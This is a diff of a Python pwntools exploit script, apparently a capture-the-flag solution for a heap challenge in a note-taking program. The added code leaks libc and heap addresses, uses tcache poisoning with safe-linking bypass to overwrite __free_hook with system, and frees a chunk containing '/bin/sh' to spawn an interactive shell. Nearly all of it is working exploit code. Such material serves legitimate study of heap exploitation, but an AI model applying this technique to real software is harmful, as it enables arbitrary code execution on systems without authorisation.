@@ -36,33 +36,42 @@ def delete_note(page):
 def edit_note(page , content):
     r.sendlineafter(b'Exit',b'3')
     r.sendlineafter(b'Index:', str(page).encode())
-    r.sendlineafter(b'Content:' , content)
+    r.sendafter(b'Content:' , content)
 
 def show_note(page):
     r.sendlineafter(b'Exit',b'4')
     r.sendlineafter(b'Index:', str(page).encode())
 
-for i in range(9):
+for i in range(10):
     add_note(i,0x80)
-for i in range(8):
+for i in range(7):
     delete_note(i)
 
-edit_note(7,b'a')
-show_note(7)
-r.recv(6)
-libc_addr = u64(r.recv(6).ljust(8,b'\x00')) - 0x61 - 0x1d9a00 - 0x7000
-print(f'libc_addr  = {hex(libc_addr )}')
-libc.address = libc_addr 
+delete_note(8)
+edit_note(8,b'a')
+show_note(8)
+
+libc_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) - 0x61 - 0x1e3c00
+print(f'libc_addr  = {hex(libc_addr)}')
+libc.address = libc_addr
 system_addr = libc.sym['system']
 free_hook = libc.sym['__free_hook']
 print(f'free_hook = {hex(free_hook)}')
 print(f'system_addr = {hex(system_addr)}')
-gdb.attach(r)
-pause()
+show_note(6)
+r.recv()
+heap=u64(r.recv(5)+b'\x00\x00\x00')
+edit_note(0,p64(free_hook ^ heap))
+print(f'heap = {hex(heap)}')
+print(f'free_hook ^ heap = {hex(free_hook ^ heap)}')
 
-# r.sendlineafter()
-# r.send()
-# r.recvuntil()
+add_note(10,0x80)
+edit_note(10,b'/bin/sh')
+add_note(11,0x80)
+edit_note(11,p64(system_addr))
+delete_note(10)
+
+
 r.interactive()
 
 
